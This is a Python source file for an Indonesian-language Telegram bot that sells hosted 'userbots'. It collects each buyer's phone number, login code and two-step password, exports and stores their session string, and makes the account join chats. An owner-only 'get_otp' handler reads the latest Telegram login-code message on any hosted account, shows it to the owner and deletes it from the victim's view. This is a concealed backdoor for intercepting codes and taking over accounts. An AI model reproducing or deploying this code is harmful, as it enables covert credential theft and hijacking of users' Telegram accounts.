import asyncio
import importlib

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from datetime import datetime
from time import time

from uu import *
from uu.modules import loadModule

from config import *
from config import Config


@PY.BOT("start", filters.private)
@PY.START
async def _(client, message):
    msg = MSG.START(message)
    buttons = BTN.START(message)
    await message.reply(msg, reply_markup=buttons)


@PY.CALLBACK("home")
async def _(client, callback_query):
    buttons = BTN.START(callback_query)
    await callback_query.message.edit(f"""
<b>👋🏻 Hallo <a href=tg://user?id={callback_query.from_user.id}>{callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}</a>!
@{TB.me.username} userbot yang bisa kalian buat dengan mudah.</b>
""", reply_markup=InlineKeyboardMarkup(buttons))


@PY.CALLBACK("status")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in TU._get_my_id:
        buttons = [
            [InlineKeyboardButton("🔙 Back", callback_data=f"home {user_id}")],
        ]
        exp = await DB.get_expired(user_id)
        prefix = await TU.get_pref(user_id)
        waktu = exp.strftime("%d-%m-%Y") if exp else "None"
        if user_id in await DB.get_list_vars(client.me.id, "ultra_users"):
            uu = "Ultra Premium"
        elif user_id in await DB.get_list_vars(client.me.id, "acc_users"):
            uu = "Premium"
        else:
            uu = "none"
        return await callback_query.edit_message_text(
            f"""
<b>Userbot Status!!</b>
 <b>Status:</b> <i>{uu}</i>
 <b>Prefix:<b> {prefix[0]}
 <b>Expired:</b> {waktu} 
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [
            [InlineKeyboardButton("Buy UserBot", callback_data=f"bahan_ubot")],
            [InlineKeyboardButton("🔙 Back", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>‼️Anda belum memiliki userbot! silahkan untuk membeli terlebih dahulu</ʙ>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("bahan_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in TU._get_my_id:
        return await callback_query.answer("Anda sudah memilik serbot!", True)
    elif len(TU._ubot) + 1 > Config.MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🔙 Back", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
<b>❌ Tidak bisa membuat userbot!</b>
<b>Karena maksimal userbot adalah {(str(len(TU._ubot)))}</b>

<b>☎️ Hubungi: <a href=tg://openmessage?user_id=Config.OWNER_ID>Owner</a></b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await DB.get_list_vars(client.me.id, "acc_users"):
        return await callback_query.edit_message_text(
            f"""
<b>Silakan hubungi Owner dibawah ini,
Untuk membeli userbot.</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="Owner", user_id=Config.OWNER_ID),
                ],
            ]
          )
        )
    else:
        buttons = ikb([
            ["| lanjutkan - dep_ubot |"],
        ])
        return await callback_query.edit_message_text(
            """
<b>Silahkan siapkan bahan di bawah ini!</b>

<b>Number Phone</b>
<b>2fa Verification</b>

<b>Jika sudah silahkan pencet tombol dibawah ini</b>
""",
            disable_web_page_preview=True,
            reply_markup=buttons,
        )

@PY.CALLBACK("dep_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await TB.ask(
            user_id,
            (
                "<b>Silahkan masukan nomer akun telegram anda dengan format kode negara!!!\nContoh: +628xxxxxxx</b>\n"
                "\n<b>Gunakan /cancel Untuk membatalkan</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await TB.send_message(user_id, "<b>Pembatalan otomatis!!!\nGunakan /start Untuk memulai ulang</b>")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        in_memory=False,
    )
    get_otp = await TB.send_message(user_id, "<b>Mengirim kode otp...!!</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await TB.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await TB.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await TB.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await TB.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await TB.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await TB.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>TELEGRAM</a>",
            SentCodeType.SMS: "SMS AMDA",
            SentCodeType.CALL: "PANGGILAN",
            SentCodeType.FLASH_CALL: "PANGGILAN KILAT",
            SentCodeType.FRAGMENT_SMS: "FRAGMENT SMS",
            SentCodeType.EMAIL_CODE: "EMAIL ANDA",
        }
        await get_otp.delete()
        otp = await TB.ask(
            user_id,
            (
                f"<b>Silahkan periksa kode otp dari {sent_code[code.type]}</b>\n"
                "<b>Jika kode otp adalah: <code>12345</code>\nKirimkan seperti ini: <code>1 2 3 4 5</code></b>\n"
                "\n<b>Gunakan /cancel Untuk membatalkan</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await TB.send_message(user_id, "<b>Pembatalan otomatis!\nGunakan /start Memulai ulang</b>")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await TB.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await TB.send_message(user_id, PCE)
    except BadRequest as error:
        return await TB.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await TB.ask(
                user_id,
                "<b>Akun anda telah mengaktifkan 2f-A.\nKirimkan sandi 2f-A anda di sini\n\nGunakan /cancel Membatalkan proses</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await TB.send_message(user_id, "<b>Pembatalan otomatis!\nGunakan /start Memulai ulang</b>")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
        except Exception as error:
            return await TB.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await TB.send_message(
        user_id,
        "<b>Sedang memproses!!\n\nSilahkan tunggu sebentar</b>",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        TU._ubot.remove(new_client)
        return await bot_msg.edit(
            "<b>Maaf nomer akun telegram anda tidak valid!!\nSilahkan gunakan nomer dari akun telegram dari akun yang anda gunakan sekarang!!!</b>"
        )
    await DB.add_ubot(
        user_id=int(new_client.me.id),
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        session_string=session_string,
    )
    await DB.remove_list_vars(client.me.id, "acc_users", user_id)
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"uu.modules.{mod}"))
    get_exp = await DB.get_expired(client.me.id)
    exp = get_exp.strftime("%d-%m-%Y") if get_exp else "None"
    if user_id in await DB.get_list_vars(client.me.id, "prem_users"):
        type = "Premium"
    elif user_id in await DB.get_list_vars(client.me.id, "ultra_users"):
        type = "Ultrapremium"
    else:
        type = "Null"
    text_done = f"""
<b>Userbot Started!!</b>
 <b>Status:</b> <i>Running</i>
  <b>Plan:<b> {type}
  <b>Id:</b> {new_client.me.id}
  <b>Name:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
  <b>Expired:</b> {exp}
        """
    buttons = ikb([
      ["| Support - https://t.me/LeXcZ_Alokk |"],
    ])
    await bot_msg.edit(text_done, reply_markup=buttons, disable_web_page_preview=True)
    await bash("rm -rf *session*")
    try:
        await new_client.join_chat("")
        await new_client.join_chat("")
    except UserAlreadyParticipant:
        pass


@PY.BOT("control")
async def _(client, message):
    buttons = [
            [InlineKeyboardButton("Restarting!", callback_data=f"res_ubot")],
        ]
    await message.reply(
            f"""
<b>Anda akan melakukan restart?!
Jika iya silahkan pencet tombil dibawah ini!</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


@PY.CALLBACK("res_ubot")
async def _(client, callback_query):
    if callback_query.from_user.id not in TU._get_my_id:
        return await callback_query.answer(
            f"Tombol ini bukan untuk mu!!!",
            True,
        )
    for X in TU._ubot:
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await DB.get_ubot():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        TU._ubot.remove(X)
                        TU._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"uu.modules.{mod}")
                            )
                        return await callback_query.edit_message_text(
                            f"<b>Restart berhasil di lakukan!\n\nId:  {UB.me.id}\nName: {UB.me.first_name} {UB.me.last_name or ''}</b>"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(f"<b>{error}</b>")


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await TB.send_message(
            callback_query.from_user.id, "<b>Membatalkan proses!!\n\nGunakan: /start Mulai kembali</b>"
        )
        return True
    return False


@PY.BOT("getubot")
@PY.OWNER
async def _(client, callback_query):
    await TB.send_message(
        callback_query.from_user.id,
        await MSG.UBOT(0),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(TU._ubot[0].me.id, 0)),
    )


@PY.CALLBACK("^(get_otp|ub_deak|deak_akun)")
async def _(client, callback_query):
    query = callback_query.data.split()
    user_id = callback_query.from_user.id
    if user_id == Config.OWNER_ID:
        pass
    else:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = TU._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            BTN.UBOT(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)



@PY.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await DB.get_expired(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
    except:
        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)



@PY.CALLBACK("del_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id == Config.OWNER_ID:
        pass
    else:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await TB.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in TU._ubot:
        if get_id == X.me.id:
            await X.unblock_user(TB.me.username)
            await DB.remove_ubot(X.me.id)
            await DB.remove_expired(X.me.id)
            TU._get_my_id.remove(X.me.id)
            TU._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
            )
            await callback_query.edit_message_text(
                await MSG.UBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(TU._ubot[0].me.id, 0)
                ),
            )
            await TB.send_message(
                X.me.id,
                MSG.EXP_MSG_UBOT(X),
                reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
            )


@PY.CALLBACK("^(p_ub|n_ub)")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id == Config.OWNER_ID:
        pass
    else:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        if count == len(TU._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "p_ub":
        if count == 0:
            count = len(TU._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(
            BTN.UBOT(TU._ubot[count].me.id, count)
        ),
    )
